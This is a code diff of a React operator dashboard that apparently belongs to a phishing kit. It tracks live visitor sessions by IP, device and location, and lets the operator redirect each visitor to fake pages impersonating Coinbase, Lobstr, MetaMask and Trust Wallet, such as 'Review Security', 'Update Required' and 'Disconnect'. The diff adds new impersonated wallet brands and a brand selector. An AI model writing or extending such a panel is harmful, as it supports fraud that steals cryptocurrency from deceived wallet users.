@@ -148,17 +148,17 @@ const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isN
       </div>
 
       {/* Actions Row */}
-      <div className="flex items-center justify-between mt-4">
+      <div className="space-y-3 mt-4">
         <CategorizedPageSelect
           selectedPage={selectedPage}
           onPageChange={setSelectedPage}
           isHovered={false}
         />
         
-        <div className="flex items-center space-x-2">
+        <div className="flex items-center justify-between">
           <button
             onClick={() => onRedirect(session.id, selectedPage)}
-            className={`${actionButtonStyle} bg-blue-500/20 text-blue-400`}
+            className={`${actionButtonStyle} bg-blue-500/20 text-blue-400 flex-1 mr-2`}
             title="Redirect User"
           >
             <ExternalLink className={actionIconStyle} />
@@ -166,7 +166,7 @@ const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isN
 
           <button
             onClick={() => onRemove(session.id)}
-            className={`${actionButtonStyle} bg-orange-500/20 text-orange-400`}
+            className={`${actionButtonStyle} bg-orange-500/20 text-orange-400 flex-1 mx-1`}
             title="Remove Session"
           >
             <Trash2 className={actionIconStyle} />
@@ -174,7 +174,7 @@ const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isN
 
           <button
             onClick={() => onBan(session.ip)}
-            className={`${actionButtonStyle} bg-red-500/20 text-red-400`}
+            className={`${actionButtonStyle} bg-red-500/20 text-red-400 flex-1 ml-2`}
             title="Ban IP"
           >
             <Ban className={actionIconStyle} />
@@ -186,6 +186,9 @@ const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isN
 };
 
 const CategorizedPageSelect = ({ selectedPage, onPageChange, isHovered }) => {
+  const [selectedBrand, setSelectedBrand] = useState('Coinbase');
+  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
+  
   const brandCategories = {
     Coinbase: {
       Introduction: [
@@ -214,40 +217,111 @@ const CategorizedPageSelect = ({ selectedPage, onPageChange, isHovered }) => {
     Lobstr: {
       Loading: [
         { id: 'lobstrloading.html', name: 'Loading' }
+      ],
+      'Account Actions': [
+        { id: 'lobstrreview.html', name: 'Review' },
+        { id: 'lobstrcomplete.html', name: 'Complete' }
+      ]
+    },
+    MetaMask: {
+      'Security Check': [
+        { id: 'metamaskloading.html', name: 'Loading' },
+        { id: 'metamaskreview.html', name: 'Review Security' }
+      ],
+      'Wallet Actions': [
+        { id: 'metamaskdisconnect.html', name: 'Disconnect' },
+        { id: 'metamaskupdate.html', name: 'Update Required' }
+      ]
+    },
+    'Trust Wallet': {
+      Main: [
+        { id: 'trustloading.html', name: 'Loading' },
+        { id: 'trustreview.html', name: 'Review' }
+      ],
+      Security: [
+        { id: 'trustsecurity.html', name: 'Security Check' },
+        { id: 'trustcomplete.html', name: 'Complete' }
       ]
     }
   };
 
   return (
-    <div className="relative flex-shrink-0" style={{ maxWidth: '180px' }}>
+    <div className="flex items-center space-x-2">
+      {/* Brand Selector */}
+      <div className="relative">
+        <button
+          onClick={() => setIsDropdownOpen(!isDropdownOpen)}
+          className={`
+            flex items-center justify-between px-3 py-1.5 rounded-lg border
+            transition-all duration-300 min-w-[120px]
+            ${isHovered ? 'bg-white/[0.08] border-white/20' : 'bg-white/[0.05] border-white/10'}
+            text-white/80 text-xs
+            backdrop-blur-sm
+            hover:bg-white/[0.1] hover:border-white/25
+            focus:outline-none focus:border-blue-500/30 focus:ring-1 focus:ring-blue-500/20
+          `}
+        >
+          <span>{selectedBrand}</span>
+          <svg 
+            className={`w-3 h-3 ml-2 transition-transform duration-200 ${isDropdownOpen ? 'rotate-180' : ''}`}
+            fill="none" 
+            stroke="currentColor" 
+            viewBox="0 0 24 24"
+          >
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
+          </svg>
+        </button>
+        
+        {/* Brand Dropdown Menu */}
+        {isDropdownOpen && (
+          <div className="absolute top-full mt-1 left-0 w-full bg-[#1A1A1A] border border-white/20 rounded-lg shadow-xl z-50 overflow-hidden">
+            {Object.keys(brandCategories).map(brand => (
+              <button
+                key={brand}
+                onClick={() => {
+                  setSelectedBrand(brand);
+                  setIsDropdownOpen(false);
+                  // Reset to first page of the new brand
+                  const firstCategory = Object.values(brandCategories[brand])[0];
+                  if (firstCategory && firstCategory[0]) {
+                    onPageChange(firstCategory[0].id);
+                  }
+                }}
+                className={`
+                  w-full px-3 py-2 text-left text-xs transition-colors duration-200
+                  ${selectedBrand === brand 
+                    ? 'bg-blue-500/20 text-blue-400' 
+                    : 'text-white/80 hover:bg-white/10'
+                  }
+                `}
+              >
+                {brand}
+              </button>
+            ))}
+          </div>
+        )}
+      </div>
+
+      {/* Page Selector for Selected Brand */}
       <select
         value={selectedPage}
         onChange={(e) => onPageChange(e.target.value)}
-        style={{ 
-          transform: 'translate3d(0, 0, 0)',
-          transformOrigin: 'top'
-        }}
         className={`
-          relative text-xs rounded-lg border w-full
+          text-xs rounded-lg border min-w-[200px]
           transition-all duration-300
           ${isHovered ? 'bg-white/[0.08] border-white/20' : 'bg-white/[0.05] border-white/10'}
-          text-white/80 py-1 px-2
+          text-white/80 py-1.5 px-2
           backdrop-blur-sm
           focus:outline-none focus:border-blue-500/30 focus:ring-1 focus:ring-blue-500/20
           shadow-lg shadow-black/5
-          z-50
         `}
       >
-        {Object.entries(brandCategories).map(([brand, categories]) => (
-          <optgroup key={brand} label={`━━━ ${brand} ━━━`} className="bg-[#1A1A1A] text-white/80 font-bold">
-            {Object.entries(categories).map(([category, pages]) => (
-              <optgroup key={`${brand}-${category}`} label={`  ${category}`} className="bg-[#1A1A1A] text-white/60">
-                {pages.map(page => (
-                  <option key={page.id} value={page.id} className="bg-[#1A1A1A]">
-                    {page.name}
-                  </option>
-                ))}
-              </optgroup>
+        {Object.entries(brandCategories[selectedBrand] || {}).map(([category, pages]) => (
+          <optgroup key={category} label={category} className="bg-[#1A1A1A] text-white/60">
+            {pages.map(page => (
+              <option key={page.id} value={page.id} className="bg-[#1A1A1A] py-1">
+                {page.name}
+              </option>
             ))}
           </optgroup>
         ))}
@@ -337,38 +411,40 @@ const SessionHeaderRow = () => {
       <div className="absolute inset-0 bg-gradient-to-b from-white/[0.02] to-transparent opacity-0" />
       
       <div className="relative flex items-center justify-between">
-        <div className="flex flex-col w-1/4">
+        <div className="flex flex-col w-1/6">
           <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
             Session Info
           </div>
         </div>
-        <div className="w-1/6">
+        <div className="w-1/8">
           <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
             Device
           </div>
         </div>
-        <div className="w-1/6">
+        <div className="w-1/8">
           <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
             Location
           </div>
         </div>
-        <div className="w-1/6">
+        <div className="w-1/8">
           <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
             Current Page
           </div>
         </div>
-        <div className="w-1/6">
+        <div className="w-1/8">
           <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
             Last Active
           </div>
         </div>
-        <div className="w-1/6">
+        <div className="w-1/8">
           <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
             Status
           </div>
         </div>
-        <div className="w-1/6">
-          {/* Space for actions */}
+        <div className="w-1/3">
+          <div className="text-xs font-medium text-white/60 uppercase tracking-wider text-right">
+            Actions
+          </div>
         </div>
       </div>
     </div>
@@ -430,7 +506,7 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew }) => {
                      transition-opacity duration-500 ${isHovered ? 'opacity-100' : 'opacity-0'}`} />
 
       <div className="relative flex items-center justify-between">
-        <div className="flex flex-col w-1/4">
+        <div className="flex flex-col w-1/6">
           <div className="flex items-center space-x-6">
             <div className="flex flex-col">
               <div className="flex items-center space-x-2">
@@ -473,20 +549,20 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew }) => {
           </div>
         </div>
 
-        <div className="w-1/6">
+        <div className="w-1/8">
           <div className="flex flex-col">
             <span className="text-sm text-white/80">{os}</span>
             <span className="text-xs text-white/60">{browser}</span>
           </div>
         </div>
 
-        <div className="w-1/6">
+        <div className="w-1/8">
           <span className="text-sm text-white/60">
             {session.city}, {session.country}
           </span>
         </div>
 
-        <div className="w-1/6">
+        <div className="w-1/8">
           <div className={`relative inline-flex items-center px-2 py-1 rounded-md 
                         overflow-hidden transition-all duration-300
                         ${isHovered ? 'translate-x-1' : ''}`}>
@@ -498,17 +574,17 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew }) => {
           </div>
         </div>
 
-        <div className="w-1/6">
+        <div className="w-1/8">
           <HeartbeatIndicator lastHeartbeat={session.lastHeartbeat} />
         </div>
 
-        <div className="w-1/6">
+        <div className="w-1/8">
           <StatusBadge 
             status={session.loading ? 'loading' : (session.connected || session.loading ? 'connected' : 'inactive')} 
           />
         </div>
 
-        <div className="relative flex items-center justify-end space-x-4 w-1/6">
+        <div className="relative flex items-center justify-end space-x-2 w-1/3">
           <div className={`absolute inset-0 rounded-lg transition-opacity duration-300
                         ${isHovered ? 'opacity-100' : 'opacity-0'}`}>
             <div className="absolute inset-0 bg-white/[0.03] backdrop-blur-sm rounded-lg" />
